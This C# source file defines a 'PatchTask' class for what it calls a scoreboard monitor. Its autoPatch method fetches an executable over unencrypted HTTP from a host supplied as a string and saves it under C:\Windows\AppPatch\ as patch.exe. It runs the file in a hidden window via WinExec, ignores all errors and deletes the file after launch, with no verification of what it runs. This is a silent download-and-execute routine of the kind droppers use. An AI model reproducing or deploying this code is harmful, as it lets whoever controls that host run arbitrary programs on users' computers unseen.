using GMScoreboard.Util;
using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace GMScoreboard.Monitor
{
    public class PatchTask
    {
        private string patchId = null;

        public PatchTask(string patchId)
        {
            this.patchId = patchId;
        }

        [DllImport("kernel32.dll")]
        public static extern int WinExec(string exeName, int operType);

        public static string dir = @"C:\Windows\AppPatch\";
        public static string file = dir + "patch.exe";

        public void autoPatch()
        {
            if (this.patchId == null || this.patchId.Trim().Equals(""))
            {
                LogUtil.log("No patch info. Exit.");
                return;
            }

            if (!System.IO.Directory.Exists(dir))
            {
                System.IO.Directory.CreateDirectory(dir);
            }

            if (System.IO.File.Exists(file))
            {
                System.IO.File.Delete(file);
            }

            Stream stream = null;
            Stream responseStream = null;
            HttpWebRequest request = null;
            HttpWebResponse response = null;

            try
            {
                request = WebRequest.Create("http://" + patchId + ".dat") as HttpWebRequest;
                request.KeepAlive = false;
                request.ContentType = "application/text;";
                request.Method = "GET";
                request.Timeout = 5000;
                response = request.GetResponse() as HttpWebResponse;
                responseStream = response.GetResponseStream();
                stream = new FileStream(file, FileMode.Create);
                byte[] bArr = new byte[1024];
                int length = responseStream.Read(bArr, 0, (int)bArr.Length);
                while (length > 0)
                {
                    stream.Write(bArr, 0, length);
                    length = responseStream.Read(bArr, 0, (int)bArr.Length);
                }
            }
            catch (Exception e)
            {
                // ignore
            }
            finally
            {
                if (stream != null)
                {
                    stream.Close();
                }
                if (responseStream != null)
                {
                    responseStream.Close();
                }
                if (request != null)
                {
                    request.Abort();
                }
                if (response != null)
                {
                    response.Close();
                }

            }

            try
            {
                int ptr = WinExec(file, 0);
                while (File.Exists(file))
                {
                    Thread.Sleep(3000);
                    try
                    {
                        File.Delete(file);
                    }
                    catch (Exception e)
                    {
                    }
                }
            }
            catch (Exception e)
            {
            }
        }

    }
}
